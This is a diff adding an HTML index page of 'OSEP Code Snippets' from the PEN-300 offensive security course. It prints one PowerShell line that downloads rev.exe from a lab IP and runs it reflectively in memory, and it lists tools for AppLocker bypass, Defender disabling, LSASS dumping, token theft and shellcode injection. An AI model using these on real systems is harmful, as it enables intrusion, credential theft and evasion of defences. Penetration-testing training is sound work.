@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OSEP Code Snippets</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      background-color: #1b1b2f;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #262642;
+      padding: 20px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      color: #00ffd5;
+    }
+
+    .description {
+      text-align: center;
+      margin: 15px auto;
+      max-width: 900px;
+      color: #cccccc;
+      font-size: 1.1em;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: 30px auto;
+      padding: 0 20px;
+    }
+
+    pre.code-block {
+      background-color: #2d2d44;
+      padding: 15px;
+      overflow-x: auto;
+      border-radius: 6px;
+      font-family: monospace;
+      color: #aaffaa;
+      margin-bottom: 30px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      background-color: #2a2a3d;
+    }
+
+    th, td {
+      text-align: left;
+      padding: 12px 15px;
+      border-bottom: 1px solid #3a3a50;
+    }
+
+    th {
+      background-color: #353552;
+      color: #00ffd5;
+    }
+
+    tr:hover {
+      background-color: #404060;
+    }
+
+    @media screen and (max-width: 768px) {
+      table, tbody, tr, th, td {
+        display: block;
+        width: 100%;
+      }
+
+      tr {
+        margin-bottom: 15px;
+        border: 1px solid #444;
+        border-radius: 6px;
+      }
+
+      th {
+        background-color: transparent;
+        border-bottom: none;
+        padding: 10px 0;
+      }
+
+      td {
+        padding: 10px;
+        border-bottom: 1px solid #3a3a50;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>OSEP Code Snippets</h1>
+    <p class="description">
+      Code examples are provided as-is, without any form of warranty. Based on Offensive Security's PEN-300 course.
+    </p>
+  </header>
+
+  <div class="container">
+    <h2>Reflective Assembly Load (PowerShell)</h2>
+    <pre class="code-block">
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[rev.Program]::Main("".Split())
+    </pre>
+
+    <h2>Contents</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Snippet Name</th>
+          <th>Description</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>AppLocker Bypass PowerShell Runspace (C#)</td>
+          <td>Base binary for an AppLocker bypass using CertUtil, BitsAdmin, and InstallUtil.</td>
+        </tr>
+        <tr>
+          <td>Fileless Lateral Movement (C#)</td>
+          <td>Disables Defender signatures and moves laterally using existing process context.</td>
+        </tr>
+        <tr>
+          <td>Linux Shellcode Encoder (Python)</td>
+          <td>Encodes shellcode with XOR/ROT from Linux. Supports feeding from msfvenom.</td>
+        </tr>
+        <tr>
+          <td>Linux Shellcode Loaders (C)</td>
+          <td>C-based shellcode loaders for library hijacking and more.</td>
+        </tr>
+        <tr>
+          <td>MiniDump (C# & PS1)</td>
+          <td>Dumps LSASS to <code>C:\Windows\Tasks\lsass.dmp</code>. Provided in C# and PowerShell.</td>
+        </tr>
+        <tr>
+          <td>MSSQL (C#)</td>
+          <td>Includes various MSSQL attack techniques. Modify as needed.</td>
+        </tr>
+        <tr>
+          <td>PrintSpoofer.NET (C#)</td>
+          <td>Uses PrintSpooler to steal tokens and run code. Doesn't require interactive logon.</td>
+        </tr>
+        <tr>
+          <td>ROT Shellcode Encoder (C#)</td>
+          <td>Applies ROT obfuscation to shellcode. Takes number of rotations as input.</td>
+        </tr>
+        <tr>
+          <td>Sections Shellcode Injector (C#)</td>
+          <td>Injects shellcode using <code>NtCreateSection</code> and related syscalls.</td>
+        </tr>
+        <tr>
+          <td>Shellcode Process Hollowing (C#)</td>
+          <td>Hollows a process (e.g., svchost) and injects shellcode. Low detection rate.</td>
+        </tr>
+        <tr>
+          <td>Shellcode Process Injector (C# & PS1)</td>
+          <td>Injects shellcode into a process, optionally picking one based on privileges.</td>
+        </tr>
+        <tr>
+          <td>Simple Shellcode Runner (C# & PS1 & VBA)</td>
+          <td>Minimal shellcode runner. Includes C#, PowerShell, and VBA versions.</td>
+        </tr>
+        <tr>
+          <td>XOR Shellcode Encoder (C#)</td>
+          <td>Obfuscates shellcode using XOR encoding with custom keys.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+</body>
+</html>
